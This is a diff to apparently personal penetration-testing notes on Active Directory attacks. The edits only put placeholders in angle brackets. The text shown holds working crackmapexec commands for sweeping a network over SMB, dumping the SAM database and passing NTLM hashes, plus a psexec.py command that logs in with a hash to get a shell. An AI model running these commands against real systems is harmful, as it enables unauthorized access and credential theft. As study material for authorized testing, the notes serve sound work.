@@ -212,8 +212,8 @@
 * passing the hash around with ***crackmapexec.py*** which will throw around the captured hash and see where it sticks
 * install it on kali `apt install crackmapexec`
 * usage `crackmapexec --help` to get help, typically we provide a username, domain and password for now
-* `crackmapexec smb <target network IP/24> -u username -d domain.local -p password`
-* `crackmapexec smb <target network IP/24> -u username -d domain.local -p password --sam` it will try to dump the SAM file (short for SAM=Security Account Manager)
+* `crackmapexec smb <target network IP/24> -u <username> -d <domain.local> -p <password>`
+* `crackmapexec smb <target network IP/24> -u <username> -d <domain.local> -p <password> --sam` it will try to dump the SAM file (short for SAM=Security Account Manager)
 
 ### Getting a shell with psexec.py
 
@@ -228,7 +228,7 @@
 ### Pass the hash attack
 
 * NTLM hashes can be passed around, NTLMv2 hashes **can not** be passed around
-* copy second part of the hash then run it in crackmapexec `crackmapexec smb IP-range -u username -H paste_hash_here --local-auth`
+* copy second part of the hash then run it in crackmapexec `crackmapexec smb <IP-range> -u <username> -H <paste_hash_here> --local-auth`
 * see it's gonna try to pass it around the network and gain access, green plus sign indicates in succeed
 * `psexec.py "frank castle":@192.168.57.141 -hashes <HASH here, first and second part of hash needed>`
 
